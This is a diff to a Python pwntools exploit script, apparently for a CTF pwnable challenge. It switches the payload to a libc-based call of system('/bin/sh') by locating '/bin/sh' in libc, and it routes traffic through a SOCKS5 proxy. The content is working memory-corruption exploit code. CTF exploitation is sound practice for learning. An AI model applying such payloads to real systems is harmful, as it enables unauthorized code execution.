@@ -62,7 +62,7 @@ def send_payload(payload, again=True):
         do_again()
 
 
-DEBUG = True
+DEBUG = False
 
 context.proxy = (socks.SOCKS5, '192.168.152.1', 18888)
 
@@ -76,6 +76,7 @@ else:
     elf = ELF('/home/len/pwnable/libc_32.so.6')
 
 system_offset = elf.symbols['system']
+binsh_offset = next(elf.search('/bin/sh\x00'))
 
 if __name__ == '__main__':
     # pdb.set_trace()
@@ -125,11 +126,9 @@ if __name__ == '__main__':
     # set_comment('c' * 0x50 + p32(28) + p32(fake_chunk_addr + 8))
 
     # do_again()
-    binsh_addr = fake_chunk_addr + 8
-    binsh = '/bin/sh'.ljust(0x38, '\0')
+    binsh_addr = libc_base + binsh_offset
 
-    payload = binsh + p32(0) * 5 + p32(system_addr) + p32(0x08048908) + p32(
-        binsh_addr)
+    payload = '\0'*0x38 + p32(0) * 5 + p32(system_addr) + p32(0) + p32(binsh_addr)
     # send_payload(payload, again=False)
     pdb.set_trace()
     set_name(payload)
